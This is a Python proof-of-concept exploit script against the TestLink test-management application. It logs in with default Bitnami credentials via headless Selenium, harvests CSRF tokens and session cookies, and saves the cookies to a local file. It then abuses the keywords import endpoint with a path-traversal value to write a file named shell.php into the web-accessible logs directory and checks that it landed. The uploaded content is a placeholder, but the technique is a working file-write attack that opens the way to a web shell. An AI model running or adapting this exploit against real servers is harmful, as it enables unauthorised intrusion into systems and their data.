import sys
import time
import requests
from selenium import webdriver
from time import sleep
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By


def login(host):
    firefox_opt = webdriver.FirefoxOptions()
    firefox_opt.add_argument("--headless")
    driver = webdriver.Firefox(options=firefox_opt)
    url = host + '/index.php'
    driver.get(url)
    time.sleep(10)
    driver.find_element_by_id("tl_login").clear()
    driver.find_element_by_id("tl_login").send_keys("user")
    driver.find_element_by_id("tl_password").clear()
    driver.find_element_by_id("tl_password").send_keys("bitnami")
    driver.find_element_by_id("tl_login_button").click()
    time.sleep(10)
    driver.switch_to.parent_frame()
    time.sleep(10)
    driver.switch_to.frame("mainframe")
    driver.find_element_by_xpath('/html/body/div[3]/div[2]/a[4]').click()
    driver.find_element_by_xpath('/html/body/div/div/form/input[7]').click()
    csrfguard = driver.find_element_by_xpath('/html/body/div/form[1]/input[1]')
    csrfguard_name = csrfguard.get_attribute('name')
    csrfguard_value = csrfguard.get_attribute('value')
    csrfname = driver.find_element_by_xpath('/html/body/div/form[1]/input[2]')
    csrf_name = csrfname.get_attribute('name')
    csrf_value = csrfname.get_attribute('value')
    print(csrf_name, ':', csrf_value)
    cookie = driver.get_cookies()
    phpsession = cookie[0]['value']
    testlink_cookie = cookie[1]['value']
    f = open("temp", 'w+')
    print("{phpsession}".format(phpsession=phpsession), file=f)
    print("{testlink_cookie}".format(testlink_cookie=testlink_cookie), file=f)
    return phpsession, testlink_cookie, csrfguard_value, csrf_value


def exp(host, phpsession, testlink_cookie, csrfguard_value, csrf_value):
    cookies = {
        'PHPSESSID': phpsession,
        'TESTLINK1920TESTLINK_USER_AUTH_COOKIE': testlink_cookie,
    }
    headers = {

        'Content-Type': 'multipart/form-data; boundary=---------------------------300685993123735673203366676955',
    }
    data = '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFName"\n' \
           + '\n' \
           + '{csrfguard_value}'.format(csrfguard_value=csrfguard_value) \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFToken"\n' \
           + '\n' \
           + '{csrf_value}'.format(csrf_value=csrf_value) \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="importType"\n' \
           + '\n' \
           + '/../../../logs/shell.php\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="MAX_FILE_SIZE"\n' \
           + '\n' \
           + '409600\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="uploadedFile"; filename="shell.php"\n' \
           + 'Content-Type: application/octet-stream\n' \
           + '\n' \
           + '11111\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="tproject_id"\n' \
           + '\n' \
           + '1\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="UploadFile"\n' \
           + '\n' \
           + 'Upload file\n' \
           + '-----------------------------300685993123735673203366676955--\n'
    response = requests.post(host + '/lib/keywords/keywordsImport.php',
                             cookies=cookies, data=data, headers=headers, verify=False)
    print("status_code",response.status_code)
    check = requests.get(host + '/logs/shell.php',
                             cookies=cookies, headers=headers)
    print("shell content:",check.text)
    if check.status_code == 200:
        print("Poc Success!")
    else:
        print("Poc failed!")



if __name__ == '__main__':
   
    if len(sys.argv) != 2:
         print('Usages:exp.py testlink_host')
         exit(0)
    h = sys.argv[1]
    tup = login(h)
    phpsession = tup[0]
    testlink_cookie = tup[1]
    csrfguard_value = tup[2]
    csrf_value = tup[3]
    exp(h, phpsession, testlink_cookie, csrfguard_value, csrf_value)
